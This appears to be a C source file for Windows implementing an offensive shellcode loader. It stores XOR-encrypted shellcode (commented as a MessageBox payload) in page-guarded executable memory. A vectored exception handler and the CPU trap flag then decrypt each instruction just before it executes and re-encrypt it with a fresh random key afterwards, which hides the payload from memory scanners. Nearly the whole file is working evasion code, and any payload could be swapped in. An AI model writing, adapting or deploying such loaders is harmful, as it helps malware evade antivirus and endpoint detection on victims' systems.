#include <Windows.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>

// for generating random numbers
#include "xoshiro.h"

#define TRAP_FLAG (1 << 8)
#define STUB_SIZE 4096
#if defined(_WIN32) && !defined(_WIN64)
#define CURRENT_IP(x) x->ContextRecord->Eip
#elif defined(_WIN64)
#define CURRENT_IP(x) x->ContextRecord->Rip
#else
#error "ERROR: This singlestsep xor stub implementation is for Windows only!"
#endif

// i386 MessageBox shellcode
char xored_shellcode[]
    = "\xc4\x53\xb3\x6a\xe4\x49\xf6\x12\xa3\x9d\xaa\x01\xc8\x20\x95\x8d\x2e"
      "\x9b\x0a\x80\xbf\x95\xad\x5e\x21\x36\x1f\x18\x0e\xf1\xe6\xeb\x4a\xf1"
      "\x99\x1e\x25\x49\xee\x49\x92\xd1\x88\x4b\x9e\x8a\xf9\xa1\x84\x75\x39"
      "\x3f\x5d\x4f\xe2\xcc\x91\x43\x06\x2b\x36\xe1\xdd\xae\xba\x35\x75\x74"
      "\x94\xc5\xdf\x10\x20\x93\xf6\xbc\xf8\xf4\x3d\x46\x51\xbf\x25\xdc\xc7"
      "\x36\x4e\x75\x67\xec\xf3\x4e\x90\xc7\x86\xca\x25\x25\x0e\xe4\x00\x53"
      "\xda\x02\x1c\xbb\xe0\x02\x27\x10\x92\x28\xce";

static uintptr_t stub = 0;
static uintptr_t stub_end = 0;
static uintptr_t last_ip = -1;
static bool is_page_guarded = 0;
static char *xor_block = 0;

void
xor_blocks (char *src, char *dst, size_t size)
{
    for (size_t i = 0; i < size; i++)
        {
            dst[i] ^= src[i];
        }
}

LONG WINAPI
handler (EXCEPTION_POINTERS *exception)
{
    uint64_t newkey[2];

    switch (exception->ExceptionRecord->ExceptionCode)
        {
        case STATUS_SINGLE_STEP:
            stub_procedure:
            if (last_ip >= stub && last_ip < stub_end)
                {
                    // we just executed a opcode inside the stub, so xor it again with current key
                    xor_blocks (&xor_block[last_ip - stub], (char *)last_ip,
                                min (15, stub_end - last_ip));
                }

            if (CURRENT_IP (exception) >= stub
                && CURRENT_IP (exception) < stub_end)
                {
                    // toggle singlestep for next instruction
                    exception->ContextRecord->EFlags |= TRAP_FLAG;
                    // save current ip
                    last_ip = CURRENT_IP (exception);

                    // decrypt current shellcode
                    xor_blocks (&xor_block[last_ip - stub], (char *)last_ip,
                                min (15, stub_end - CURRENT_IP (exception)));

                    // generate new xor key for current opcode
                    newkey[0] = next ();
                    newkey[1] = next ();

                    // move new keys to xorkey block
                    memcpy (&xor_block[last_ip - stub], newkey,
                            min (15, stub_end - CURRENT_IP (exception)));

                    if (true == is_page_guarded
                        && EXCEPTION_GUARD_PAGE
                               != exception->ExceptionRecord->ExceptionCode)
                        {
                            DWORD old;
                            VirtualProtect (
                                (LPVOID)stub, stub_end - stub,
                                PAGE_EXECUTE_READWRITE | PAGE_GUARD, &old);
                        }
                }
            else
                {
                    // unset last ip
                    last_ip = -1;
                }

            return EXCEPTION_CONTINUE_EXECUTION;
        case STATUS_ACCESS_VIOLATION:
            if (CURRENT_IP (exception) == 0x1337)
                {
                    // begin singlestep stub
                    CURRENT_IP (exception) = stub;
                    goto stub_procedure;
                }
            break;
        case EXCEPTION_GUARD_PAGE:
            if (CURRENT_IP (exception) >= stub
                && CURRENT_IP (exception) < stub_end)
                {
                    goto stub_procedure;
                }
            break;
        default:
            return EXCEPTION_CONTINUE_SEARCH;
        
        }

    return EXCEPTION_CONTINUE_SEARCH;
}

int
main (int argc, char **argv)
{
    PVOID exception_handler;

    uint64_t seeds[4]
        = { 0x12391818181, 0x83838102810, 0x8318041e801, 0xe81038013810 };
    DWORD old;

    stub = (uintptr_t)VirtualAlloc (NULL, STUB_SIZE, MEM_COMMIT,
                                    PAGE_READWRITE);

    is_page_guarded = true;
    stub_end = stub + STUB_SIZE;

    memcpy ((void *)stub, xored_shellcode, sizeof (xored_shellcode) - 1);

    // activate PAGE_GUARD after we finished setting it up.
    VirtualProtect ((LPVOID)stub, stub_end - stub,
                    PAGE_EXECUTE_READWRITE | PAGE_GUARD, &old);

    // register exception handler for catching singlesteps and exceptions
    exception_handler = AddVectoredExceptionHandler (1, &handler);

    xor_block = calloc (STUB_SIZE, sizeof (char));

    // seed our random generator
    seed_generator (seeds);

    // fill xorkey block
    for (size_t i = 0; i < STUB_SIZE / sizeof (uint64_t); i++)
        {
            ((uint64_t *)xor_block)[i] = next ();
        }

    // throw exception on PAGE_GUARD access
    return ((int (*) (void))stub) (); 
}